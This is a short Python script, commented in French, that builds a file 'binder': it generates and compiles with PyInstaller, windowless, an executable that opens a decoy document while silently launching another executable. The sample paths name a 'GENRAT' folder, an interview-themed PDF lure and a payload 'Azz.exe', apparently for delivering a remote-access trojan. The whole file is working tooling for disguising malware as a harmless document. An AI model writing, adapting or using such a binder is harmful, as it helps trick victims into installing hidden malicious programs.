import os
import subprocess
import shutil

def bind_files(input_pdf, input_exe, output_exe):
    """
    Combine l'ouverture d'un fichier (PDF, DOCX, ou TXT) avec l'exécution d'un .exe.

    :param input_pdf: Chemin vers le fichier légitime à afficher.
    :param input_exe: Chemin vers le fichier exécutable à exécuter.
    :param output_exe: Nom de l'exécutable final combiné.
    """
    # Crée un script temporaire
    binder_code = f"""
import os
import subprocess

def execute_and_show():
    file_to_show = "{input_pdf}"
    exe_to_run = "{input_exe}"

    os.startfile(file_to_show)
    subprocess.Popen(exe_to_run, shell=True)

if __name__ == "__main__":
    execute_and_show()
"""

    # Sauvegarder ce code temporairement avec encodage UTF-8
    temp_file = "temp_binder.py"
    with open(temp_file, "w", encoding="utf-8") as f:
        f.write(binder_code)

    # Convertir le script temporaire en un exécutable
    subprocess.run(["pyinstaller", "--onefile", "--noconsole", "-n", output_exe, temp_file])

    # Nettoyer les fichiers temporaires générés par PyInstaller
    os.remove(temp_file)
    build_folder = "build"
    dist_folder = "dist"
    spec_file = f"{output_exe}.spec"

    if os.path.exists(build_folder):
        shutil.rmtree(build_folder)
    if os.path.exists(spec_file):
        os.remove(spec_file)

    print(f"Fichier combiné '{output_exe}.exe' généré avec succès dans le dossier {dist_folder}/")

if __name__ == "__main__":
    input_pdf = "C:\\Users\\HP\\OneDrive\\Desktop\\GENRAT\\GENRAT\\EntretienV2.pdf"
    input_exe = "C:\\Users\\HP\\OneDrive\\Desktop\\GENRAT\\GENRAT\\dist\\Azz.exe"
    output_exe = "fichier_combiné"

    bind_files(input_pdf, input_exe, output_exe)
